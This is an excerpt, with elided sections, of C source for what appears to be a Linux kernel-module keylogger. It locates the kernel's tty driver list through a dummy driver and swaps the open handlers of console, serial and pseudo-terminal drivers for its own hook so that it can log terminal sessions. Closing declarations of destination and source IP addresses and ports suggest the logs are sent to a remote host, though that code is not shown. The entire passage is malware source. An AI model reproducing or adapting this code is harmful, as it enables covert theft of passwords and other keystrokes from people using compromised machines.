...
new_driver_open(struct tty_struct *tty, struct file *filp)
{
	...
	DPRINT("driver_open: dev=%s%d - driver_open = %p\n",
	    TTY_NAME(tty), TTY_NUMBER(tty), DRV_OPEN(tty));
	...
	if (ret >= 0) {
		spin_lock_irqsave(&vlogger_lock, flags);
		if (tty != NULL &&
		    ((DRV_TYPE(tty) == TTY_DRIVER_TYPE_CONSOLE &&
			    TTY_NUMBER(tty) < MAX_TTY_CON - 1) ||
			(DRV_TYPE(tty) == TTY_DRIVER_TYPE_PTY &&
			    DRV_SUBTYPE(tty) == PTY_TYPE_SLAVE &&
...
struct __initdata tty_driver vty_driver = {
	.name = "v",
	.num = 0,
	.major = TTY_MAJOR,
	.flags = TTY_DRIVER_NO_DEVFS,
#ifndef LINUX26
	.refcount = (int *) &vty_driver.num,
#endif
};

#ifdef LINUX26
struct list_head *tty_drivers_head;
#else
struct tty_driver *tty_drivers_head;
#endif

inline int
init_logger(void)
{
	struct tty_driver *pt;

	if (tty_register_driver(&vty_driver)) {
		DPRINT("Couldn't register serial driver\n");
		return -1;
	}
	
#ifdef LINUX26
	tty_drivers_head = vty_driver.tty_drivers.prev;
#else
	tty_drivers_head = vty_driver.next;
#endif

	tty_unregister_driver(&vty_driver);
	if (tty_drivers_head == NULL)
		return -1;

	DPRINT("head=%p, next=%p, prev=%p\n", tty_drivers_head, tty_drivers_head->next,
			tty_drivers_head->prev);

#ifdef LINUX26
	list_for_each_entry(pt, tty_drivers_head, tty_drivers) {
#else
	for (pt = tty_drivers_head; pt; pt = pt->next) {
#endif
		DPRINT
		    ("tty_driver: %s/MA%d/MI%d - type=%d/%d - open=%p/close=%p\n",
		    pt->name, pt->major, pt->minor_start + pt->num, pt->type,
		    pt->subtype, pt->open, pt->close);

		switch (pt->type) {
		case TTY_DRIVER_TYPE_CONSOLE:
			old_vc_open = pt->open;
			pt->open = new_driver_open;
			break;
		case TTY_DRIVER_TYPE_SERIAL:
			old_serial_open = pt->open;
			pt->open = new_driver_open;
			break;
		case TTY_DRIVER_TYPE_PTY:
			old_pty_open = pt->open;
			pt->open = new_driver_open;
			break;
		}
	}
...
cleanup_logger(void)
{
	...
	log_mode = VK_DISABLE;
		...
		case TTY_DRIVER_TYPE_CONSOLE:
			...
			break;
		case TTY_DRIVER_TYPE_SERIAL:
			pt->open = old_serial_open;
			break;
		case TTY_DRIVER_TYPE_PTY:
			pt->open = old_pty_open;
			break;
		}
	}
...
__initdata char *dest_ip;
__initdata char *src_ip;
__initdata int src_port, dst_port;
